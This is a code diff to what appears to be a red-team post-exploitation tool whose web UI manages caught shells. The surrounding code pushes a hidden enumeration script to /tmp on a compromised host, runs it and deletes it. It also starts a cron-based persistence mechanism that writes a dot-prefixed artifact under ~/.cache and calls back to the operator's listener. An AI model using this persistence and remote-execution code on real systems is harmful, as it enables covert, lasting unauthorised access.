@@ -18,6 +18,7 @@ def register_sessions_routes(app: FastAPI, ctx) -> None:
 
     # --- engagement hook: caught shell → its host + the activity feed ------------
     def _link_host(session):
+        import logging
         from ...store import Store
         from .. import collab
         st = Store(db_path)
@@ -26,10 +27,11 @@ def register_sessions_routes(app: FastAPI, ctx) -> None:
             label = (host.hostname or session.host_ip) if host is not None else session.host_ip
             if host is not None and not getattr(host, "access_gained", False):
                 host.access_gained = True
-                st.upsert_host(host)
+                host.access_detail = "shell caught"
+                st.upsert_host(host, merge=True)
             collab.add_activity(st, "recce", "session", f"shell caught from {label}")
         except Exception:  # noqa: BLE001 — a hook must never break adoption
-            pass
+            logging.getLogger("recce.webui").debug("_link_host failed for %s", session.host_ip, exc_info=True)
         finally:
             st.close()
         broker.publish({"type": "session", "event": "caught",
@@ -174,7 +176,9 @@ def register_sessions_routes(app: FastAPI, ctx) -> None:
             raise HTTPException(500, "recce-enum.sh not found")
         # push the enum script (chunked — avoids the PTY line limit), then run + capture.
         # bash (the script needs bashisms) piped through cat (so it doesn't colorize a tty).
-        await _push_file(sess, "/tmp/.re.sh", open(enum_sh, "rb").read())
+        with open(enum_sh, "rb") as _fh:
+            _enum_data = _fh.read()
+        await _push_file(sess, "/tmp/.re.sh", _enum_data)
         out = await sess.run_and_capture(
             b"bash /tmp/.re.sh 2>/dev/null | cat; rm -f /tmp/.re.sh", timeout=240.0)
         if not out.strip():
@@ -278,9 +282,12 @@ def register_sessions_routes(app: FastAPI, ctx) -> None:
             raise HTTPException(400, "only the 'cron' mechanism is supported so far")
         lhost, lport = sess.local_addr
         pid = uuid.uuid4().hex[:10]
-        marker = "rc" + pid[:6]
+        marker = "rc" + pid
         # resolve $HOME so the artifact lands somewhere that survives a reboot (not /tmp)
+        import re as _re
         home = (await sess.run_and_capture(b'printf %s "$HOME"')).strip().decode("ascii", "replace") or "/root"
+        if not _re.fullmatch(r"/[A-Za-z0-9_./-]{1,200}", home):
+            home = "/tmp"
         path = f"{home}/.cache/.{marker}"
         qpath = shlex.quote(path)
         await sess.send(b"mkdir -p " + shlex.quote(f"{home}/.cache").encode() + b"\n")
